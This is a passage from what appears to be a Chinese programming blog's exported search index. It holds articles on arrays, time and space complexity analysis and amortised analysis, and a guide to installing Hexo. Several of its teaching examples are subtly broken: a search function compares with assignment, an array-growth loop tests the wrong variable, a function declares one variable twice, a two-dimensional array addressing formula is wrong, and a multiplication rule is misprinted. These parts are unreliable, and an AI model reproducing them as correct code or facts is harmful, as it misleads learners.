如果该列表中没有该数据 System.out.println("缓存中没有该数据！"); if (size == cap)&#123; // 1、缓存满了 // 删除最后一个节点 lruList.delete(size-1); // 将该数据插入到链表头部 lruList.push(val); System.out.println("缓存已满！将该数据插入到缓存"); &#125;else &#123; // 2、缓存未满 // 直接在列表头部插入该数据 lruList.push(val); size++; System.out.println("将该数据直接插入到缓存"); &#125; // 如果有数据库，该数据从数据库中获取 result = val; &#125; return result; &#125; public int Size()&#123; return size; &#125;&#125; 字符串是否是回文字符串：12]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-数组]]></title>
    <url>%2Fposts%2F2018-09-10-%E7%AE%97%E6%B3%95-%E6%95%B0%E7%BB%84.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({}); 前言 提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。 是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。 在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。 数组如何实现随机访问？ 什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。 这里有几个关键词： 第一是线性表。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。 与线性表相对应的概念是非线性表，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。 第二个是连续的内存空间和相同类型的数据。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。 说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？ 我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。 我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。 $$ a[i]\_address = base\_address + i * data\_type\_size $$ 其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。 很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。 低效的“插入”和“删除”前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？ 插入操作假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。 如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+…+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。 如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。 删除操作跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。 和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。 实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？ 我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。 为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。 如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。 警惕数组越界问题了解数组的几个基本操作后，再来看看数据的访问越界问题。 这里以一段C语言代码为例来进行说明： 123456789int main(int argc, char* argv[])&#123; int i = 0; int arr[3] = &#123;0&#125;; for(i; i&lt;=3; i++)&#123; arr[i] = 0; printf("hello world\n"); &#125; return 0;&#125; 你发现问题了吗？这段代码并不是打印三行”hello world”，而是会无限打印”hello world”，这是为什么呢？ 我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i&lt;=3而非i&lt;3，所以当i=3时，数组访问越界。 我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。 关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: https://blog.csdn.net/liuhuiyi/article/details/7526889 数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。 所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。 但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。 容器能否完全代替数组?针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？ 以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。 不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。 作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。 1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。 2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。 对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。 解答开篇为什么数组的索引是从0开始，而不是从1开始呢？ 从数组存储的内存模型来看，”下标”即索引最确切的定义应该是”偏移(offset)”，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可$$ a[k]\_address = base\_address + k * type\_size $$ 但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：$$ a[k]\_address = base\_address + (k-1) * type\_size $$ 对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。 不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。 C语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。 思考题1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？ JVM标记清除垃圾回收算法：分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。 该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。 二维数组的寻址公式： 根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：$$ arr[i][j]\_address = base\_address + (i + n*j)*data\_type\_size $$ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-最好、最坏、平均、均摊时间复杂度]]></title>
    <url>%2Fposts%2F2018-09-09-%E7%AE%97%E6%B3%95-%E6%9C%80%E5%A5%BD%E3%80%81%E6%9C%80%E5%9D%8F%E3%80%81%E5%B9%B3%E5%9D%87%E3%80%81%E5%9D%87%E6%91%8A%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6.html</url>
    <content type="text"><![CDATA[前言 前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。 这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识： 最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度。 最好、最坏时间复杂度 我们先用学过的知识试着分析以下代码的时间复杂度： 1234567891011int findArray(int[] arr, int n, int target)&#123; int i = 0; int pos = -1; for(i; i&lt;n; i++)&#123; if(arr[i] = target)&#123; pos = i; &#125; &#125; return pos;&#125; 上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。 但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码： 123456789101112int findArray(int[] arr, int n, int target)&#123; int i = 0; int pos = -1; for(i; i&lt;n; i++)&#123; if(arr[i] = target)&#123; pos = i; break; &#125; &#125; return pos;&#125; 但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？ 因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。 为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：最好情况时间复杂度、最坏情况复杂度、平均时间复杂度。 顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。 同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。 平均时间复杂度我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：平均情况时间复杂度，简称平均时间复杂度。 平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。 要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即： $$ \frac{1+2+3+…+n+n}{n+1} = \frac{n(n + 3)}{2(n + 1)} $$ 我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。 这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。 我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\frac{1}{2}$。 不在数组中时，时间复杂度为: $n\times\frac{1}{2}$; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:$\frac{1}{2n}$, 因此在数组中时的时间复杂度为：$(1+2+3+…+n)\times\frac{1}{2n} $。 那平均时间复杂度就是：$(1+2+3+…+n)\times\frac{1}{2n} + n\times\frac{1}{2} = \frac{3n+1}{4} = O(n)$。 这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做加权平均时间复杂度或者期望时间复杂度。 实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。 均摊时间复杂度目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：均摊时间复杂度，以及它对应的分析方法摊还分析。 均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。 还是以一个例子来说明(别太在意例子，只是为了说明)： 1234567891011121314151617int[] arr = new int[n];int size = 0；void insert(int val)&#123; // 如果数组满了 if(count == arr.length)&#123; int sum = 0; for(int i=0; i&lt;arr.length;i++)&#123; sum = sum + arr[i]; &#125; arr[0] = sum; count = 1; &#125; // 数组赋值 arr[count] = val; ++count;&#125; 先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。 那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。 最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} +….+ 1\times\frac{1}{n+1} + n\times\frac{1}{n+1} = O(1) $。 我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。 针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：摊还分析法，通过摊还分析得到的时间复杂度我们起了一个名字叫：摊还时间复杂度。 那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？ 我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。 均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。 对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。 思考题：根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。 1234567891011121314151617181920int[] arr = new int[10];int len = 10;int i=0;void add(int element)&#123; // 数组空间满了 if(i&gt;=len)&#123; // 数组扩容 int new_arr = new int[len*2]; // 把数组拷贝到新数组 for(int j=0; i&lt;len; j++)&#123; new_arr[j] = arr[j]; &#125; arr = new_arr; len = len*2; &#125; // 添加到数组中 arr[i] = element; ++i;&#125; 分析：在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。 平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} + 1\times\frac{1}{n+1} +….+ 1\times\frac{1}{n+1} + n\times\frac{1}{n+1} = O(1) $。 均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>复杂度分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-复杂度分析]]></title>
    <url>%2Fposts%2F2018-09-08-%E7%AE%97%E6%B3%95-%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({}); 前言 我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。 为什么需要复杂度分析 有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？ 1、首先，这种评估方法确实是准确的，但是这种方法是”事后统计法”，是有非常大的局限性。 2、测试结果非常依赖测试环境，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。 3、对于不同的数据集，如果数据的有序程度不一样，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，数据规模的大小也可能对算法产生影响。 因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。 大O复杂度表示法 算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？ 这里举一个简单的例子，求解1，2，3……n 的累加和，以下为一个简单的代码实现： 1234567int sum(int n)&#123; int sum = 0; for (int i=1; i&lt;=n; i++)&#123; sum += i; &#125; return sum;&#125; 从CPU的角度看，每一行代码都执行着类似的操作：读数据-运算-写数据。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算： 第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \times n \times time $，所以此段代码执行的时间为$ (2n + 1)\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。 按照这个思路，再对以下代码段进行分析： 12345678int sum(int n)&#123; int sum = 0; for(int i=1; i &lt;= n; i++)&#123; for(int j=1; j &lt;= n; j++)&#123; sum += i*j; &#125; &#125;&#125; 假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？ 第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n*time $,内层循环第四、五行代码都执行了$ n*n $次,需要的时间为$ 2*n^2*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)*time $。 尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律： 所有的代码执行时间T(n)与每行代码的执行次数成正比$$ T(n) = O(f(n)) $$ 其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。 所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。 在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $; 时间复杂度分析 前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？ 1、只关注循环次数最多的一段代码在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。 2、加法法则：总复杂度等于量级最大的那段代码的复杂度如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。 注意：当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。 3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) * O(n) = O(n^2) $ 几种常见时间复杂度 1、$O(1)$O(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。 2、$ O(logN)、O(N*logN) $对数阶的时间复杂度非常常见，同时也是最难分析的一种。 1234int i = 1;while(i &lt;= n)&#123; i = i * 2;&#125; 在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8……,所以i的取值规律为 $$ 2^0 \&nbsp;&nbsp;&nbsp;&nbsp; 2^1 \&nbsp;&nbsp; 2^2 \&nbsp;&nbsp; 2^3 … 2^k… 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\log_2 N) $。 如果把代码改为如下。那时间复杂度是多少呢？ 1234int i = 1;while(i &lt;= n)&#123; i = i * 3;&#125; 根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。 实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？ 我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32*log_2N $，所以$ O(log_32) = O(C * log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： 在采用大O标记复杂度的时候，可以忽略系数，即$ O(C*f(n)) = O(f(n)) $。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。 如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。 2、$ O(m+n)、O(m*n) $我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。 123456789101112int func(int m, int n)&#123; int sum1 = 0; for(int i=1; i&lt;=m; i++)&#123; sum1 += i; &#125; int sum1 = 0; for(int j=1; j&lt;=m; j++)&#123; sum1 += j; &#125; return sum1+sum2;&#125; 从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$， 针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) * f(n)) $。 空间复杂度 前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。 还是拿具体的例子说明(仅供测试,一般没人这么写) 12345678void func(int n)&#123; int i = 0; int[] a = new int[n]; for(i; i&lt;n; i++)&#123; a[i] = i*1; print(a[i]); &#125;&#125; 和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n). 我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>复杂度分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo-安装及配置]]></title>
    <url>%2Fposts%2F2018-09-07-hexo-%E5%AE%89%E8%A3%85%E5%8F%8A%E9%85%8D%E7%BD%AE.html</url>
    <content type="text"><![CDATA[前言曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。 一、预备1、安装Nodejs及npm Nodejs下载地址： 官网下载地址：https://nodejs.org/zh-cn/download/ 2、安装Git Git下载地址： 官网下载地址：https://git-scm.com/download/ 安装完成后，执行如下命令，可以显示版本号就算安装成功了 12345678$ node -vv9.11.1$ npm -v6.3.0$ git --versiongit version 2.17.0.windows.1 二、安装hexo进入命令行，执行如下命令: 1234567891011121、全局安装hexo$ npm install hexo -g2、创建hexo工作目录$ mkdir hexo-blog$ cd hexo-blog3、初始化工作目录$ hexo init4、本地启动hexo$ hexo serve 到此一个hexo博客已经搭建完成了，可以访问 http://localhost:4000/ 查看博客的效果。 当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。 三、hexo配置hexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照hexo官网文档进行配置，当然，有兴趣可以参照我的配置 网站配置：12345678# Sitetitle: Aries' blog 网站标题subtitle: 副标题description: 我不生产知识，我只是知识的搬运工。 网站一句话描述keywords: 关键词author: 无名万物 作者language: zh-CN 语言timezone: Asia/Shanghai 时区 文章配置：1234url: http://blog.renhj.org 网站urlroot: / 文章根路径permalink: posts/:year-:month-:day-:title.html 文章urlpermalink_defaults: 四、创建新文章你可以通过以下命令来创建一篇新文章1hexo new [layout] &lt;title&gt; 命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局. 当然也可以新建一个草稿： draft，这种布局在建立时会保存到source/_drafts文件夹，也可以通过publish来将草稿移动到正式文件夹。 12345# 新建草稿文章$ hexo new draft &lt;title&gt;# 将文章正式发布$ hexo publish [layout] &lt;title&gt; Front-matter Front-matter是文章最上方以--- 分割的区域，用于指定个别文件的变量 12345678910---layout: 指定文章的布局属性title： 文章标题data：建立日期updated： 更新日期comments： 是否开启文章的评论功能(如果有的话)tags： 标签categories：分类permalink： 覆盖文章的网址--- 修改美化默认的主题是有点丑，可以去hexo的主题商店 找一个自己喜欢的、漂亮的主题。 本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：hexo nexT主题，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>博客</tag>
        <tag>nexT</tag>
        <tag>Github Pages</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Markdown来写文章]]></title>
    <url>%2Fposts%2F2018-09-06-%E7%94%A8Markdown%E6%9D%A5%E5%86%99%E6%96%87%E7%AB%A0.html</url>
